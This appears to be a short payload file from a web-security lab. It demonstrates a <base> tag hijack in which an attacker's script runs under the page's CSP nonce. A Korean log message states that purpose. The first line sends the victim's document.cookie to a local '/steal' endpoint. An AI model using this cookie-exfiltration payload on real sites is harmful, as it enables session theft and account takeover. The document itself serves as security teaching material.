fetch(`http://localhost:4000/steal?via=base-hijack&c=${encodeURIComponent(document.cookie)}`, { mode: "no-cors" });
window.lab?.log("pwn", "<base> 하이재킹: 공격자의 widget.js 가 우리 nonce 를 달고 실행됨");
